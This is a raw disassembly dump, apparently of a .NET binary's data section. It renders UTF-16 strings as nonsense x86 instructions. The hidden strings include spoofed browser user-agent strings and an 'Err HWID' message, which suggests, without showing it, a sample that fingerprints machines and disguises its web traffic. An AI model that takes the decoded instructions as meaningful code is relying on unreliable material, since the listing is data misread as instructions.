  40bb45:	00 31                	add    %dh,(%ecx)
  40bb47:	00 30                	add    %dh,(%eax)
  40bb49:	00 30                	add    %dh,(%eax)
  40bb4b:	00 31                	add    %dh,(%ecx)
  40bb4d:	00 30                	add    %dh,(%eax)
  40bb4f:	00 31                	add    %dh,(%ecx)
  40bb51:	00 20                	add    %ah,(%eax)
  40bb53:	00 46 00             	add    %al,0x0(%esi)
  40bb56:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40bb5c:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bb60:	78 00                	js     0x40bb62
  40bb62:	2f                   	das
  40bb63:	00 36                	add    %dh,(%esi)
  40bb65:	00 36                	add    %dh,(%esi)
  40bb67:	00 2e                	add    %ch,(%esi)
  40bb69:	00 30                	add    %dh,(%eax)
  40bb6b:	00 00                	add    %al,(%eax)
  40bb6d:	81 13 4d 00 6f 00    	adcl   $0x6f004d,(%ebx)
  40bb73:	7a 00                	jp     0x40bb75
  40bb75:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40bb7b:	61                   	popa
  40bb7c:	00 2f                	add    %ch,(%edi)
  40bb7e:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40bb84:	00 20                	add    %ah,(%eax)
  40bb86:	00 28                	add    %ch,(%eax)
  40bb88:	00 69 00             	add    %ch,0x0(%ecx)
  40bb8b:	50                   	push   %eax
  40bb8c:	00 68 00             	add    %ch,0x0(%eax)
  40bb8f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb90:	00 6e 00             	add    %ch,0x0(%esi)
  40bb93:	65 00 3b             	add    %bh,%gs:(%ebx)
  40bb96:	00 20                	add    %ah,(%eax)
  40bb98:	00 43 00             	add    %al,0x0(%ebx)
  40bb9b:	50                   	push   %eax
  40bb9c:	00 55 00             	add    %dl,0x0(%ebp)
  40bb9f:	20 00                	and    %al,(%eax)
  40bba1:	69 00 50 00 68 00    	imul   $0x680050,(%eax),%eax
  40bba7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bba8:	00 6e 00             	add    %ch,0x0(%esi)
  40bbab:	65 00 20             	add    %ah,%gs:(%eax)
  40bbae:	00 4f 00             	add    %cl,0x0(%edi)
  40bbb1:	53                   	push   %ebx
  40bbb2:	00 20                	add    %ah,(%eax)
  40bbb4:	00 31                	add    %dh,(%ecx)
  40bbb6:	00 31                	add    %dh,(%ecx)
  40bbb8:	00 5f 00             	add    %bl,0x0(%edi)
  40bbbb:	34 00                	xor    $0x0,%al
  40bbbd:	5f                   	pop    %edi
  40bbbe:	00 31                	add    %dh,(%ecx)
  40bbc0:	00 20                	add    %ah,(%eax)
  40bbc2:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bbc6:	00 6b 00             	add    %ch,0x0(%ebx)
  40bbc9:	65 00 20             	add    %ah,%gs:(%eax)
  40bbcc:	00 4d 00             	add    %cl,0x0(%ebp)
  40bbcf:	61                   	popa
  40bbd0:	00 63 00             	add    %ah,0x0(%ebx)
  40bbd3:	20 00                	and    %al,(%eax)
  40bbd5:	4f                   	dec    %edi
  40bbd6:	00 53 00             	add    %dl,0x0(%ebx)
  40bbd9:	20 00                	and    %al,(%eax)
  40bbdb:	58                   	pop    %eax
  40bbdc:	00 29                	add    %ch,(%ecx)
  40bbde:	00 20                	add    %ah,(%eax)
  40bbe0:	00 41 00             	add    %al,0x0(%ecx)
  40bbe3:	70 00                	jo     0x40bbe5
  40bbe5:	70 00                	jo     0x40bbe7
  40bbe7:	6c                   	insb   (%dx),%es:(%edi)
  40bbe8:	00 65 00             	add    %ah,0x0(%ebp)
  40bbeb:	57                   	push   %edi
  40bbec:	00 65 00             	add    %ah,0x0(%ebp)
  40bbef:	62 00                	bound  %eax,(%eax)
  40bbf1:	4b                   	dec    %ebx
  40bbf2:	00 69 00             	add    %ch,0x0(%ecx)
  40bbf5:	74 00                	je     0x40bbf7
  40bbf7:	2f                   	das
  40bbf8:	00 36                	add    %dh,(%esi)
  40bbfa:	00 30                	add    %dh,(%eax)
  40bbfc:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  40bc02:	00 2e                	add    %ch,(%esi)
  40bc04:	00 31                	add    %dh,(%ecx)
  40bc06:	00 35 00 20 00 28    	add    %dh,0x28002000
  40bc0c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bc0f:	48                   	dec    %eax
  40bc10:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40bc14:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  40bc18:	00 20                	add    %ah,(%eax)
  40bc1a:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bc1e:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc21:	65 00 20             	add    %ah,%gs:(%eax)
  40bc24:	00 47 00             	add    %al,0x0(%edi)
  40bc27:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc2b:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40bc2e:	00 29                	add    %ch,(%ecx)
  40bc30:	00 20                	add    %ah,(%eax)
  40bc32:	00 56 00             	add    %dl,0x0(%esi)
  40bc35:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc39:	73 00                	jae    0x40bc3b
  40bc3b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bc41:	2f                   	das
  40bc42:	00 31                	add    %dh,(%ecx)
  40bc44:	00 31                	add    %dh,(%ecx)
  40bc46:	00 2e                	add    %ch,(%esi)
  40bc48:	00 30                	add    %dh,(%eax)
  40bc4a:	00 20                	add    %ah,(%eax)
  40bc4c:	00 4d 00             	add    %cl,0x0(%ebp)
  40bc4f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc50:	00 62 00             	add    %ah,0x0(%edx)
  40bc53:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40bc59:	2f                   	das
  40bc5a:	00 31                	add    %dh,(%ecx)
  40bc5c:	00 35 00 45 00 31    	add    %dh,0x31004500
  40bc62:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc65:	38 00                	cmp    %al,(%eax)
  40bc67:	20 00                	and    %al,(%eax)
  40bc69:	53                   	push   %ebx
  40bc6a:	00 61 00             	add    %ah,0x0(%ecx)
  40bc6d:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40bc71:	72 00                	jb     0x40bc73
  40bc73:	69 00 2f 00 36 00    	imul   $0x36002f,(%eax),%eax
  40bc79:	30 00                	xor    %al,(%eax)
  40bc7b:	34 00                	xor    $0x0,%al
  40bc7d:	2e 00 31             	add    %dh,%cs:(%ecx)
  40bc80:	00 00                	add    %al,(%eax)
  40bc82:	80 e7 4d             	and    $0x4d,%bh
  40bc85:	00 6f 00             	add    %ch,0x0(%edi)
  40bc88:	7a 00                	jp     0x40bc8a
  40bc8a:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40bc90:	61                   	popa
  40bc91:	00 2f                	add    %ch,(%edi)
  40bc93:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40bc99:	00 20                	add    %ah,(%eax)
  40bc9b:	00 28                	add    %ch,(%eax)
  40bc9d:	00 57 00             	add    %dl,0x0(%edi)
  40bca0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40bca6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bca7:	00 77 00             	add    %dh,0x0(%edi)
  40bcaa:	73 00                	jae    0x40bcac
  40bcac:	20 00                	and    %al,(%eax)
  40bcae:	4e                   	dec    %esi
  40bcaf:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bcb3:	00 31                	add    %dh,(%ecx)
  40bcb5:	00 30                	add    %dh,(%eax)
  40bcb7:	00 2e                	add    %ch,(%esi)
  40bcb9:	00 30                	add    %dh,(%eax)
  40bcbb:	00 3b                	add    %bh,(%ebx)
  40bcbd:	00 20                	add    %ah,(%eax)
  40bcbf:	00 57 00             	add    %dl,0x0(%edi)
  40bcc2:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40bcc8:	34 00                	xor    $0x0,%al
  40bcca:	3b 00                	cmp    (%eax),%eax
  40bccc:	20 00                	and    %al,(%eax)
  40bcce:	78 00                	js     0x40bcd0
  40bcd0:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40bcd4:	29 00                	sub    %eax,(%eax)
  40bcd6:	20 00                	and    %al,(%eax)
  40bcd8:	41                   	inc    %ecx
  40bcd9:	00 70 00             	add    %dh,0x0(%eax)
  40bcdc:	70 00                	jo     0x40bcde
  40bcde:	6c                   	insb   (%dx),%es:(%edi)
  40bcdf:	00 65 00             	add    %ah,0x0(%ebp)
  40bce2:	57                   	push   %edi
  40bce3:	00 65 00             	add    %ah,0x0(%ebp)
  40bce6:	62 00                	bound  %eax,(%eax)
  40bce8:	4b                   	dec    %ebx
  40bce9:	00 69 00             	add    %ch,0x0(%ecx)
  40bcec:	74 00                	je     0x40bcee
  40bcee:	2f                   	das
  40bcef:	00 35 00 33 00 37    	add    %dh,0x37003300
  40bcf5:	00 2e                	add    %ch,(%esi)
  40bcf7:	00 33                	add    %dh,(%ebx)
  40bcf9:	00 36                	add    %dh,(%esi)
  40bcfb:	00 20                	add    %ah,(%eax)
  40bcfd:	00 28                	add    %ch,(%eax)
  40bcff:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd02:	48                   	dec    %eax
  40bd03:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40bd07:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  40bd0b:	00 20                	add    %ah,(%eax)
  40bd0d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bd11:	00 6b 00             	add    %ch,0x0(%ebx)
  40bd14:	65 00 20             	add    %ah,%gs:(%eax)
  40bd17:	00 47 00             	add    %al,0x0(%edi)
  40bd1a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bd1e:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40bd21:	00 29                	add    %ch,(%ecx)
  40bd23:	00 20                	add    %ah,(%eax)
  40bd25:	00 43 00             	add    %al,0x0(%ebx)
  40bd28:	68 00 72 00 6f       	push   $0x6f007200
  40bd2d:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd30:	65 00 2f             	add    %ch,%gs:(%edi)
  40bd33:	00 36                	add    %dh,(%esi)
  40bd35:	00 30                	add    %dh,(%eax)
  40bd37:	00 2e                	add    %ch,(%esi)
  40bd39:	00 30                	add    %dh,(%eax)
  40bd3b:	00 2e                	add    %ch,(%esi)
  40bd3d:	00 33                	add    %dh,(%ebx)
  40bd3f:	00 31                	add    %dh,(%ecx)
  40bd41:	00 31                	add    %dh,(%ecx)
  40bd43:	00 32                	add    %dh,(%edx)
  40bd45:	00 2e                	add    %ch,(%esi)
  40bd47:	00 31                	add    %dh,(%ecx)
  40bd49:	00 31                	add    %dh,(%ecx)
  40bd4b:	00 33                	add    %dh,(%ebx)
  40bd4d:	00 20                	add    %ah,(%eax)
  40bd4f:	00 53 00             	add    %dl,0x0(%ebx)
  40bd52:	61                   	popa
  40bd53:	00 66 00             	add    %ah,0x0(%esi)
  40bd56:	61                   	popa
  40bd57:	00 72 00             	add    %dh,0x0(%edx)
  40bd5a:	69 00 2f 00 35 00    	imul   $0x35002f,(%eax),%eax
  40bd60:	33 00                	xor    (%eax),%eax
  40bd62:	37                   	aaa
  40bd63:	00 2e                	add    %ch,(%esi)
  40bd65:	00 33                	add    %dh,(%ebx)
  40bd67:	00 36                	add    %dh,(%esi)
  40bd69:	00 00                	add    %al,(%eax)
  40bd6b:	35 61 00 62 00       	xor    $0x620061,%eax
  40bd70:	63 00                	arpl   %eax,(%eax)
  40bd72:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40bd76:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40bd7a:	68 00 69 00 6a       	push   $0x6a006900
  40bd7f:	00 6b 00             	add    %ch,0x0(%ebx)
  40bd82:	6c                   	insb   (%dx),%es:(%edi)
  40bd83:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd86:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd87:	00 6f 00             	add    %ch,0x0(%edi)
  40bd8a:	70 00                	jo     0x40bd8c
  40bd8c:	71 00                	jno    0x40bd8e
  40bd8e:	72 00                	jb     0x40bd90
  40bd90:	73 00                	jae    0x40bd92
  40bd92:	74 00                	je     0x40bd94
  40bd94:	75 00                	jne    0x40bd96
  40bd96:	76 00                	jbe    0x40bd98
  40bd98:	77 00                	ja     0x40bd9a
  40bd9a:	78 00                	js     0x40bd9c
  40bd9c:	79 00                	jns    0x40bd9e
  40bd9e:	7a 00                	jp     0x40bda0
  40bda0:	00 11                	add    %dl,(%ecx)
  40bda2:	45                   	inc    %ebp
  40bda3:	00 72 00             	add    %dh,0x0(%edx)
  40bda6:	72 00                	jb     0x40bda8
  40bda8:	20 00                	and    %al,(%eax)
  40bdaa:	48                   	dec    %eax
  40bdab:	00 57 00             	add    %dl,0x0(%edi)
  40bdae:	49                   	dec    %ecx
  40bdaf:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bdb3:	05 78 00 32 00       	add    $0x320078,%eax
  40bdb8:	00 09                	add    %cl,(%ecx)
  40bdba:	52                   	push   %edx
  40bdbb:	00 65 00             	add    %ah,0x0(%ebp)
  40bdbe:	61                   	popa
  40bdbf:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40bdc3:	0b 57 00             	or     0x0(%edi),%edx
  40bdc6:	72 00                	jb     0x40bdc8
  40bdc8:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40bdce:	00 0b                	add    %cl,(%ebx)
  40bdd0:	46                   	inc    %esi
  40bdd1:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bdd5:	00 73 00             	add    %dh,0x0(%ebx)
  40bdd8:	68 00 00 0f 54       	push   $0x540f0000
  40bddd:	00 6f 00             	add    %ch,0x0(%edi)
  40bde0:	41                   	inc    %ecx
  40bde1:	00 72 00             	add    %dh,0x0(%edx)
  40bde4:	72 00                	jb     0x40bde6
  40bde6:	61                   	popa
  40bde7:	00 79 00             	add    %bh,0x0(%ecx)
  40bdea:	00 00                	add    %al,(%eax)
  40bdec:	2e 92                	cs xchg %eax,%edx
  40bdee:	55                   	push   %ebp
  40bdef:	4a                   	dec    %edx
  40bdf0:	1e                   	push   %ds
  40bdf1:	d2 eb                	shr    %cl,%bl
  40bdf3:	4f                   	dec    %edi
  40bdf4:	8f                   	(bad)
  40bdf5:	ff                   	(bad)
  40bdf6:	ff f7                	push   %edi
  40bdf8:	a2 51 6b e7 00       	mov    %al,0xe76b51
  40bdfd:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40be03:	34 e0                	xor    $0xe0,%al
  40be05:	89 08                	mov    %ecx,(%eax)
  40be07:	b0 3f                	mov    $0x3f,%al
  40be09:	5f                   	pop    %edi
  40be0a:	7f 11                	jg     0x40be1d
  40be0c:	d5 0a                	aad    $0xa
  40be0e:	3a 03                	cmp    (%ebx),%al
  40be10:	20 00                	and    %al,(%eax)
  40be12:	01 03                	add    %eax,(%ebx)
  40be14:	00 00                	add    %al,(%eax)
  40be16:	01 04 00             	add    %eax,(%eax,%eax,1)
  40be19:	00 12                	add    %dl,(%edx)
  40be1b:	0c 07                	or     $0x7,%al
  40be1d:	06                   	push   %es
  40be1e:	15 12 18 01 12       	adc    $0x12011812,%eax
  40be23:	0c 04                	or     $0x4,%al
  40be25:	00 00                	add    %al,(%eax)
  40be27:	12 08                	adc    (%eax),%cl
  40be29:	07                   	pop    %es
  40be2a:	06                   	push   %es
  40be2b:	15 12 18 01 12       	adc    $0x12011812,%eax
  40be30:	08 04 00             	or     %al,(%eax,%eax,1)
  40be33:	00 12                	add    %dl,(%edx)
  40be35:	11 07                	adc    %eax,(%edi)
  40be37:	06                   	push   %es
  40be38:	15 12 18 01 12       	adc    $0x12011812,%eax
  40be3d:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be40:	00 12                	add    %dl,(%edx)
  40be42:	14 07                	adc    $0x7,%al
  40be44:	06                   	push   %es
  40be45:	15 12 18 01 12       	adc    $0x12011812,%eax
  40be4a:	14 04                	adc    $0x4,%al
  40be4c:	08 00                	or     %al,(%eax)
  40be4e:	12 0c 04             	adc    (%esp,%eax,1),%cl
  40be51:	08 00                	or     %al,(%eax)
  40be53:	12 08                	adc    (%eax),%cl
  40be55:	04 08                	add    $0x8,%al
  40be57:	00 12                	add    %dl,(%edx)
  40be59:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be5c:	00 12                	add    %dl,(%edx)
  40be5e:	14 04                	adc    $0x4,%al
  40be60:	20 01                	and    %al,(%ecx)
  40be62:	02 1c 03             	add    (%ebx,%eax,1),%bl
  40be65:	20 00                	and    %al,(%eax)
  40be67:	08 04 20             	or     %al,(%eax,%eiz,1)
  40be6a:	00 12                	add    %dl,(%edx)
  40be6c:	15 03 20 00 0e       	adc    $0xe002003,%eax
  40be71:	02 1e                	add    (%esi),%bl
  40be73:	00 07                	add    %al,(%edi)
  40be75:	10 01                	adc    %al,(%ecx)
  40be77:	01 1e                	add    %ebx,(%esi)
  40be79:	00 1e                	add    %bl,(%esi)
  40be7b:	00 07                	add    %al,(%edi)
  40be7d:	30 01                	xor    %al,(%ecx)
  40be7f:	01 01                	add    %eax,(%ecx)
  40be81:	10 1e                	adc    %bl,(%esi)
  40be83:	00 02                	add    %al,(%edx)
  40be85:	13 00                	adc    (%eax),%eax
  40be87:	04 20                	add    $0x20,%al
  40be89:	00 13                	add    %dl,(%ebx)
  40be8b:	00 03                	add    %al,(%ebx)
  40be8d:	06                   	push   %es
  40be8e:	13 00                	adc    (%eax),%eax
  40be90:	04 28                	add    $0x28,%al
  40be92:	00 13                	add    %dl,(%ebx)
  40be94:	00 02                	add    %al,(%edx)
  40be96:	06                   	push   %es
  40be97:	0e                   	push   %cs
  40be98:	02 06                	add    (%esi),%al
  40be9a:	08 03                	or     %al,(%ebx)
  40be9c:	00 00                	add    %al,(%eax)
  40be9e:	02 04 00             	add    (%eax,%eax,1),%al
  40bea1:	01 18                	add    %ebx,(%eax)
  40bea3:	0e                   	push   %cs
  40bea4:	06                   	push   %es
  40bea5:	00 02                	add    %al,(%edx)
  40bea7:	02 18                	add    (%eax),%bl
  40bea9:	10 02                	adc    %al,(%edx)
  40beab:	02 06                	add    (%esi),%al
  40bead:	02 03                	add    (%ebx),%al
  40beaf:	06                   	push   %es
  40beb0:	12 19                	adc    (%ecx),%bl
  40beb2:	02 06                	add    (%esi),%al
  40beb4:	0a 03                	or     (%ebx),%al
  40beb6:	06                   	push   %es
  40beb7:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  40bebc:	1d 03 06 12 21       	sbb    $0x21120603,%eax
  40bec1:	03 06                	add    (%esi),%eax
  40bec3:	12 25 02 06 1c 04    	adc    0x41c0602,%ah
  40bec9:	00 01                	add    %al,(%ecx)
  40becb:	1c 0e                	sbb    $0xe,%al
  40becd:	03 00                	add    (%eax),%eax
  40becf:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bed2:	00 00                	add    %al,(%eax)
  40bed4:	0e                   	push   %cs
  40bed5:	05 00 01 01 12       	add    $0x12010100,%eax
  40beda:	29 05 00 01 01 1d    	sub    %eax,0x1d010100
  40bee0:	05 04 00 01 01       	add    $0x1010004,%eax
  40bee5:	0e                   	push   %cs
  40bee6:	04 00                	add    $0x0,%al
  40bee8:	01 01                	add    %eax,(%ecx)
  40beea:	1c 03                	sbb    $0x3,%al
  40beec:	06                   	push   %es
  40beed:	1d 0e 03 06 12       	sbb    $0x1206030e,%eax
  40bef2:	2d 05 00 02 01       	sub    $0x1020005,%eax
  40bef7:	0e                   	push   %cs
  40bef8:	02 0b                	add    (%ebx),%cl
  40befa:	00 08                	add    %cl,(%eax)
  40befc:	18 0e                	sbb    %cl,(%esi)
  40befe:	08 08                	or     %cl,(%eax)
  40bf00:	08 08                	or     %cl,(%eax)
  40bf02:	08 08                	or     %cl,(%eax)
  40bf04:	08 02                	or     %al,(%edx)
  40bf06:	06                   	push   %es
  40bf07:	18 0a                	sbb    %cl,(%edx)
  40bf09:	00 05 02 06 10 0e    	add    %al,0xe100602
  40bf0f:	08 10                	or     %dl,(%eax)
  40bf11:	0e                   	push   %cs
  40bf12:	08 06                	or     %al,(%esi)
  40bf14:	00 02                	add    %al,(%edx)
  40bf16:	01 0e                	add    %ecx,(%esi)
  40bf18:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf1d:	1c 1d                	sbb    $0x1d,%al
  40bf1f:	05 07 00 03 01       	add    $0x1030007,%eax
  40bf24:	02 0e                	add    (%esi),%cl
  40bf26:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf2b:	18 12                	sbb    %dl,(%edx)
  40bf2d:	44                   	inc    %esp
  40bf2e:	06                   	push   %es
  40bf2f:	00 03                	add    %al,(%ebx)
  40bf31:	18 08                	sbb    %cl,(%eax)
  40bf33:	18 18                	sbb    %bl,(%eax)
  40bf35:	04 00                	add    $0x0,%al
  40bf37:	01 0e                	add    %ecx,(%esi)
  40bf39:	09 04 00             	or     %eax,(%eax,%eax,1)
  40bf3c:	01 00                	add    %eax,(%eax)
  40bf3e:	00 03                	add    %al,(%ebx)
  40bf40:	06                   	push   %es
  40bf41:	12 44 08 00          	adc    0x0(%eax,%ecx,1),%al
  40bf45:	04 18                	add    $0x18,%al
  40bf47:	08 12                	or     %dl,(%edx)
  40bf49:	44                   	inc    %esp
  40bf4a:	18 09                	sbb    %cl,(%ecx)
  40bf4c:	04 00                	add    $0x0,%al
  40bf4e:	01 02                	add    %eax,(%edx)
  40bf50:	18 07                	sbb    %al,(%edi)
  40bf52:	00 04 18             	add    %al,(%eax,%ebx,1)
  40bf55:	18 08                	sbb    %cl,(%eax)
  40bf57:	18 18                	sbb    %bl,(%eax)
  40bf59:	03 00                	add    (%eax),%eax
  40bf5b:	00 18                	add    %bl,(%eax)
  40bf5d:	06                   	push   %es
  40bf5e:	00 02                	add    %al,(%edx)
  40bf60:	09 18                	or     %ebx,(%eax)
  40bf62:	10 09                	adc    %cl,(%ecx)
  40bf64:	04 00                	add    $0x0,%al
  40bf66:	01 06                	add    %eax,(%esi)
  40bf68:	08 05 00 01 02 1d    	or     %al,0x1d020100
  40bf6e:	05 04 00 01 18       	add    $0x18010004,%eax
  40bf73:	09 0c 00             	or     %ecx,(%eax,%eax,1)
  40bf76:	07                   	pop    %es
  40bf77:	08 09                	or     %cl,(%ecx)
  40bf79:	09 1d 05 12 31 08    	or     %ebx,0x8311205
  40bf7f:	09 18                	or     %ebx,(%eax)
  40bf81:	05 00 02 09 09       	add    $0x9090200,%eax
  40bf86:	09 07                	or     %eax,(%edi)
  40bf88:	00 03                	add    %al,(%ebx)
  40bf8a:	01 02                	add    %eax,(%edx)
  40bf8c:	10 02                	adc    %al,(%edx)
  40bf8e:	02 06                	add    (%esi),%al
  40bf90:	00 02                	add    %al,(%edx)
  40bf92:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bf95:	35 04 00 01 08       	xor    $0x8010004,%eax
  40bf9a:	08 04 00             	or     %al,(%eax,%eax,1)
  40bf9d:	01 02                	add    %eax,(%edx)
  40bf9f:	0e                   	push   %cs
  40bfa0:	03 06                	add    (%esi),%eax
  40bfa2:	12 39                	adc    (%ecx),%bh
  40bfa4:	34 61                	xor    $0x61,%al
  40bfa6:	00 62 00             	add    %ah,0x0(%edx)
  40bfa9:	63 00                	arpl   %eax,(%eax)
  40bfab:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40bfaf:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40bfb3:	68 00 69 00 6a       	push   $0x6a006900
  40bfb8:	00 6b 00             	add    %ch,0x0(%ebx)
  40bfbb:	6c                   	insb   (%dx),%es:(%edi)
  40bfbc:	00 6d 00             	add    %ch,0x0(%ebp)
  40bfbf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfc0:	00 6f 00             	add    %ch,0x0(%edi)
  40bfc3:	70 00                	jo     0x40bfc5
  40bfc5:	71 00                	jno    0x40bfc7
  40bfc7:	72 00                	jb     0x40bfc9
  40bfc9:	73 00                	jae    0x40bfcb
  40bfcb:	74 00                	je     0x40bfcd
  40bfcd:	75 00                	jne    0x40bfcf
  40bfcf:	76 00                	jbe    0x40bfd1
  40bfd1:	77 00                	ja     0x40bfd3
  40bfd3:	78 00                	js     0x40bfd5
  40bfd5:	79 00                	jns    0x40bfd7
  40bfd7:	7a 00                	jp     0x40bfd9
  40bfd9:	03 06                	add    (%esi),%eax
  40bfdb:	12 3d 04 00 01 0e    	adc    0xe010004,%bh
  40bfe1:	08 06                	or     %al,(%esi)
  40bfe3:	00 01                	add    %al,(%ecx)
  40bfe5:	02 10                	add    (%eax),%dl
  40bfe7:	11 48 03             	adc    %ecx,0x3(%eax)
  40bfea:	06                   	push   %es
  40bfeb:	11 48 03             	adc    %ecx,0x3(%eax)
  40bfee:	00 00                	add    %al,(%eax)
  40bff0:	08 03                	or     %al,(%ebx)
  40bff2:	06                   	push   %es
  40bff3:	11 41 07             	adc    %eax,0x7(%ecx)
  40bff6:	00 03                	add    %al,(%ebx)
  40bff8:	08 18                	or     %bl,(%eax)
  40bffa:	12 31                	adc    (%ecx),%dh
  40bffc:	08 06                	or     %al,(%esi)
  40bffe:	00 01                	add    %al,(%ecx)
  40c000:	11 4c 11 4c          	adc    %ecx,0x4c(%ecx,%edx,1)
  40c004:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c009:	0e                   	push   %cs
  40c00a:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c00f:	05 04 00 01 0e       	add    $0xe010004,%eax
  40c014:	0e                   	push   %cs
  40c015:	06                   	push   %es
  40c016:	00 02                	add    %al,(%edx)
  40c018:	02 0e                	add    (%esi),%cl
  40c01a:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  40c01f:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c024:	06                   	push   %es
  40c025:	12 45 05             	adc    0x5(%ebp),%al
  40c028:	20 02                	and    %al,(%edx)
  40c02a:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c02d:	0a 20                	or     (%eax),%ah
  40c02f:	05 12 29 08 18       	add    $0x18082912,%eax
  40c034:	18 12                	sbb    %dl,(%edx)
  40c036:	4d                   	dec    %ebp
  40c037:	1c 05                	sbb    $0x5,%al
  40c039:	20 01                	and    %al,(%ecx)
  40c03b:	18 12                	sbb    %dl,(%edx)
  40c03d:	29 06                	sub    %eax,(%esi)
  40c03f:	20 03                	and    %al,(%ebx)
  40c041:	18 08                	sbb    %cl,(%eax)
  40c043:	18 18                	sbb    %bl,(%eax)
  40c045:	02 06                	add    (%esi),%al
  40c047:	09 03                	or     %eax,(%ebx)
  40c049:	06                   	push   %es
  40c04a:	11 4c 04 00          	adc    %ecx,0x0(%esp,%eax,1)
  40c04e:	00 00                	add    %al,(%eax)
  40c050:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c054:	00 00                	add    %al,(%eax)
  40c056:	04 01                	add    $0x1,%al
  40c058:	00 00                	add    %al,(%eax)
  40c05a:	00 05 20 01 01 11    	add    %al,0x11010120
  40c060:	5d                   	pop    %ebp
  40c061:	08 01                	or     %al,(%ecx)
  40c063:	00 01                	add    %al,(%ecx)
  40c065:	00 00                	add    %al,(%eax)
  40c067:	00 00                	add    %al,(%eax)
  40c069:	00 05 20 02 01 0e    	add    %al,0xe010220
  40c06f:	0e                   	push   %cs
  40c070:	18 01                	sbb    %al,(%ecx)
  40c072:	00 0a                	add    %cl,(%edx)
  40c074:	4d                   	dec    %ebp
  40c075:	79 54                	jns    0x40c0cb
  40c077:	65 6d                	gs insl (%dx),%es:(%edi)
  40c079:	70 6c                	jo     0x40c0e7
  40c07b:	61                   	popa
  40c07c:	74 65                	je     0x40c0e3
  40c07e:	08 31                	or     %dh,(%ecx)
  40c080:	34 2e                	xor    $0x2e,%al
  40c082:	30 2e                	xor    %ch,(%esi)
  40c084:	30 2e                	xor    %ch,(%esi)
  40c086:	30 00                	xor    %al,(%eax)
  40c088:	00 06                	add    %al,(%esi)
  40c08a:	15 12 18 01 12       	adc    $0x12011812,%eax
  40c08f:	0c 06                	or     $0x6,%al
  40c091:	15 12 18 01 12       	adc    $0x12011812,%eax
  40c096:	08 06                	or     %al,(%esi)
  40c098:	15 12 18 01 12       	adc    $0x12011812,%eax
  40c09d:	11 06                	adc    %eax,(%esi)
  40c09f:	15 12 18 01 12       	adc    $0x12011812,%eax
  40c0a4:	14 04                	adc    $0x4,%al
  40c0a6:	07                   	pop    %es
  40c0a7:	01 12                	add    %edx,(%edx)
  40c0a9:	0c 04                	or     $0x4,%al
  40c0ab:	07                   	pop    %es
  40c0ac:	01 12                	add    %edx,(%edx)
  40c0ae:	08 04 07             	or     %al,(%edi,%eax,1)
  40c0b1:	01 12                	add    %edx,(%edx)
  40c0b3:	11 04 07             	adc    %eax,(%edi,%eax,1)
  40c0b6:	01 12                	add    %edx,(%edx)
  40c0b8:	14 04                	adc    $0x4,%al
  40c0ba:	20 01                	and    %al,(%ecx)
  40c0bc:	01 0e                	add    %ecx,(%esi)
  40c0be:	0c 01                	or     $0x1,%al
  40c0c0:	00 07                	add    %al,(%edi)
  40c0c2:	4d                   	dec    %ebp
  40c0c3:	79 2e                	jns    0x40c0f3
  40c0c5:	55                   	push   %ebp
  40c0c6:	73 65                	jae    0x40c12d
  40c0c8:	72 00                	jb     0x40c0ca
